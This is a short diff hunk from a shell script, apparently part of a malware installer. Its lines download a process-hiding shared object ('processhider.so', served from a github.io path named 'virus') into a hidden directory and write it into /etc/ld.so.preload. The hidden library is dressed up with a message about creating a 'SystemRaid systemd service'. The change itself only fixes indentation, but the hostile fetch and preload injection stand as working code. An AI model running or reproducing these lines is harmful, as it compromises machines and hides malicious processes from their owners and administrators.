@@ -141,7 +141,7 @@ if [ -f "$HOME/.configures/p.so" ]
     else
     echo "[*] Creating SystemRaid systemd service"
     wget -O $HOME/.configures/p.so https://park74110.github.io/virus/processhider.so
-       echo $HOME/.configures/p.so >/etc/ld.so.preload
+    echo $HOME/.configures/p.so >/etc/ld.so.preload
 fi
 
 
